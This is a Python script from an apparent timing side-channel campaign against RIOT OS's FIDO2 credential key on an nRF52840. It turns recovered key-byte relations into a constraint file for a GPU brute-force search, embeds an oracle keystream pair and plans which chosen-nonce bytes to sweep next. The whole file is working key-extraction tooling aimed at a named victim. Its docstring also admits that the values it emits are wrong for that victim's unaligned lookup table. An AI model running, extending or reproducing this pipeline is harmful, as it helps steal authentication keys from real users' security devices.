#!/usr/bin/env python3
"""Turn what the ladder recovered into a constraint file the offline search can read.

The two halves of this attack were built separately and this is the join: the ladder
([`ladder_campaign.py`](ladder_campaign.py)) produces *relations* between key bytes, and
the search (`fast_fido_search`, 3.15 Gcandidate/s, 2^44 in 1 h 33 m) consumes the
single-anchor constraint format in
[`GPU_SEARCH_REQUIREMENTS.md`](GPU_SEARCH_REQUIREMENTS.md) §3. Nothing converted one
into the other, so the campaign's output had to be read by eye.

It also answers the only question that matters between runs: **how far is the ladder
from a file worth searching**, and which relation to go after next.

The format imposes a graph condition, which is worth knowing before spending bench time
--------------------------------------------------------------------------------------
!! THIS SCRIPT ASSUMES A 16-BYTE-ALIGNED TABLE, AND THIS VICTIM'S IS NOT ALIGNED !!

Every relation below is treated as an XOR difference, `(k[p] ^ k[q]) >> 2`, which is exact
only when the table starts on a 16-byte boundary. RIOT declares
`static const u32 Te0[256]` with no alignment attribute, and the campaign's own argmins
put this victim at `pad = 4`, where the line of entry `i` is `(i + 1) >> 2` and a collision
is a shared 4-entry WINDOW rather than an XOR class -- the same six bits of information in
an algebra this format cannot express. See RESULTS.md section 5h and
GPU_SEARCH_REQUIREMENTS.md section 2.

So the COMPONENT and BIT accounting this script prints is still right -- six bits per
relation, two left per byte, and the connectivity argument below is unaffected -- but the
`diff6` VALUES it emits are only valid at pad 0. Do not feed its output to the search for
this victim until both carry the pad.

--------------------------------------------------------------------------------------
The search file names ONE anchor byte and gives `diff6[i]` for every other byte
relative to it. So it can only express relations that form a **connected** graph through
the anchor. A relation between two bytes in some other component -- for instance
`(k[9]^k[14])>>2` when the anchor's component is `{3,4,5,10}` -- cannot be written down
at all, and both its bytes have to be enumerated whole.

That makes the bridging steps a requirement of the format rather than an optimisation,
and this script prices the difference: it reports the information-theoretic residual
(what the ladder actually knows) alongside the residual the file can express, and the
gap between them is exactly the relations stranded in other components.

Which relations to chase
------------------------
Adjacency in the victim's compiled round-1 order decides what a step can even measure:

    0, 15, 5, 10, 4, 3, 9, 14, 8, 11, 7, 13, 2, 1, 12, 6

The attacker-controlled bytes (the chosen CCM nonce, AES 1..12) fall into three runs --
`[5,10,4,3,9]`, `[8,11,7]`, `[2,1,12,6]` -- separated by bytes they cannot vary. Those
separators are not obstacles but **references**: AES 14 (counter middle byte) sits
between runs one and two, AES 13 (the NUL nonce byte) between two and three, and AES 15
(counter low byte) beside run one. Each presents a fixed round-1 index, so colliding a
controlled byte with one bridges two runs -- and it pays MORE than a chain adjacency, as
`extend-9` measured. Only AES 0 is unreachable: it is first in the order and its lone
neighbour is also uncontrolled.

So a fully connected graph over fifteen bytes needs no second bootstrap.
"""

from __future__ import annotations

import argparse
import json
from pathlib import Path

HERE = Path(__file__).resolve().parent
EXEC_ORDER = [0, 15, 5, 10, 4, 3, 9, 14, 8, 11, 7, 13, 2, 1, 12, 6]
CONTROLLED = set(range(1, 13))          # the twelve chosen CCM nonce bytes
# AES input byte -> its fixed round-1 input value, for the bytes an attacker cannot vary
FIXED_INPUT = {0: 1, 13: 0, 14: 0, 15: None}    # 15 varies with the counter, 0..9


def relations_from_state(state: dict) -> list[tuple[int, int, int, str]]:
    """(byte_a, byte_b, diff6, provenance) for each stage that produced a relation."""
    out = []
    for name, rec in state.get("stages", {}).items():
        if not rec.get("complete") or rec.get("too_thin"):
            continue
        matched = rec.get("matched")
        off = rec.get("offset")
        if off is None:
            continue
        # A stage records which relation its argmin matched. Older runs stored a single
        # integer under "expected"; newer ones a dict keyed by relation.
        exp = rec.get("expected")
        if isinstance(exp, dict) and matched:
            lbl = matched[0]
            if lbl == "chain":
                out.append((rec["chain_anchor"], rec["test"], off & 0xFC, name)
                           if "chain_anchor" in rec else None)
            continue
    return [r for r in out if r]


def components(rels: list[tuple[int, int, int]]) -> dict[int, list[int]]:
    parent = {i: i for i in range(16)}

    def find(a):
        while parent[a] != a:
            a = parent[a]
        return a

    for a, b, _ in rels:
        parent[find(a)] = find(b)
    comp: dict[int, list[int]] = {}
    for i in range(16):
        comp.setdefault(find(i), []).append(i)
    return comp


def diff6_within(rels: list[tuple[int, int, int]], members: list[int],
                 anchor: int) -> dict[int, int]:
    """Propagate the pairwise top-6 differences out from the anchor over one component."""
    known = {anchor: 0}
    changed = True
    while changed:
        changed = False
        for a, b, d in rels:
            if a in known and b not in known:
                known[b] = known[a] ^ d
                changed = True
            elif b in known and a not in known:
                known[a] = known[b] ^ d
                changed = True
    return {i: v for i, v in known.items() if i in members}


def missing_steps(comp: dict[int, list[int]], anchor: int) -> list[str]:
    """The steps still needed to pull every reachable byte into the anchor's component.

    Not the same as "every unmeasured adjacent pair": a pair can already be connected
    THROUGH other relations, and one step can bring in a whole stranded component. With
    `(k[9]^k[14])` already in hand, the single step joining AES 9 to the chain brings
    both 9 and 14, so counting pairs over-reports the work.
    """
    pos = {b: i for i, b in enumerate(EXEC_ORDER)}
    # Which component each byte currently belongs to.
    owner = {}
    for root, members in comp.items():
        for m in members:
            owner[m] = root
    have_comp = set(comp[owner[anchor]])

    # Edges the ladder can actually measure: adjacent in the executed order, with at
    # least one side controlled so it can be swept, and not AES 0 (whose only neighbour
    # is also uncontrolled).
    edges = []
    for i in range(len(EXEC_ORDER) - 1):
        a, b = EXEC_ORDER[i], EXEC_ORDER[i + 1]
        if a == 0 or b == 0 or not (a in CONTROLLED or b in CONTROLLED):
            continue
        edges.append((a, b))

    out, guard = [], 0
    while guard < 32:
        guard += 1
        for a, b in edges:
            inside, outside = (a, b) if a in have_comp else (b, a)
            if inside not in have_comp or outside in have_comp:
                continue
            brought = sorted(comp[owner[outside]])
            kind = ("chain extension" if a in CONTROLLED and b in CONTROLLED
                    else f"reference collision with k[{a if a not in CONTROLLED else b}]")
            out.append(f"sweep AES {outside} against AES {inside} "
                       f"(positions {pos[outside]},{pos[inside]}) -- {kind}; "
                       f"brings in {brought}")
            have_comp.update(brought)
            break
        else:
            break
    left = [i for i in range(16) if i not in have_comp and i != 0]
    if left:
        out.append(f"UNREACHABLE by adjacency: {left}")
    return out


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--state", default=str(HERE / "ladder_campaign_state.json"))
    ap.add_argument("--format-vector", default=str(HERE / "format_vector.json"),
                    help="supplies the hardware-verified oracle pair")
    ap.add_argument("--relations", default=None,
                    help="override: 'a:b:diff6,...' e.g. 5:10:184,4:5:132 -- use when "
                         "the state file predates the per-relation bookkeeping")
    ap.add_argument("--anchor", type=int, default=None,
                    help="anchor byte; default is the largest component's lowest index")
    ap.add_argument("--out", default=None)
    args = ap.parse_args()

    if args.relations:
        rels = []
        for tok in args.relations.split(","):
            a, b, d = (int(x, 0) for x in tok.split(":"))
            rels.append((a, b, d & 0xFC))
    else:
        state = json.loads(Path(args.state).read_text())
        rels = [(a, b, d) for a, b, d, _ in relations_from_state(state)]
    if not rels:
        print("no relations: pass --relations, or run a campaign whose state records "
              "which relation each stage matched")
        return 1

    print("relations in hand:")
    for a, b, d in rels:
        print(f"  (k[{a}] ^ k[{b}]) >> 2 = {d >> 2}   (offset 0x{d:02x})")

    comp = components(rels)
    sized = sorted(comp.values(), key=len, reverse=True)
    print("\ncomponents:")
    true_bits = 0
    for m in sized:
        cost = 8 * len(m) if len(m) == 1 else 6 + 2 * len(m)
        true_bits += cost
        print(f"  {m}  -> {cost} bits")
    print(f"\ninformation-theoretic residual: 2^{true_bits}")

    anchor = args.anchor if args.anchor is not None else min(sized[0])
    main_comp = next(m for m in sized if anchor in m)
    d6 = diff6_within(rels, main_comp, anchor)
    reached = sorted(d6)
    unreached = [i for i in range(16) if i not in reached]
    file_bits = 6 + 2 * len(reached) + 8 * len(unreached)
    print(f"\nwith the single-anchor file format, anchor byte {anchor}:")
    print(f"  expressible: {reached}")
    print(f"  enumerated whole: {unreached}")
    print(f"  file residual: 2^{file_bits}"
          + (f"   ({file_bits - true_bits} bits WORSE than what the ladder knows, "
             f"because relations in other components cannot be written down)"
             if file_bits > true_bits else ""))

    fv = json.loads(Path(args.format_vector).read_text())
    doc = {
        "what": "constraints recovered by the flash-accelerator timing ladder against "
                "RIOT's FIDO2 credential key",
        "provenance": "measured on an nRF52840 running unmodified RIOT over its own USB",
        "search_space_bits": file_bits,
        "search_space": 2 ** file_bits,
        "anchor_byte": anchor,
        "diff6": [(d6[i] >> 2) if i in d6 else None for i in range(16)],
        "unknown_low2_bytes": reached,
        "known_low2": {},
        "unreached_bytes": unreached,
        "oracle": [{"counter_block_hex": fv["counter_block_A1_hex"],
                    "keystream_hex": fv["keystream_block_1_hex"]}],
        "notes": {
            "relations_measured": [f"(k[{a}]^k[{b}])>>2={d >> 2}" for a, b, d in rels],
            "information_theoretic_bits": true_bits,
            "stranded_relations": file_bits - true_bits,
        },
    }
    steps = missing_steps(comp, anchor)
    print(f"\nsteps still needed to connect every reachable byte ({len(steps)}):")
    for s in steps:
        print(f"  {s}")
    print("\nAES 0 is excluded: first in the executed order, and its only neighbour "
          "(AES 15) is also uncontrolled.")

    if args.out:
        Path(args.out).write_text(json.dumps(doc, indent=2) + "\n")
        print(f"\nwrote {args.out}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
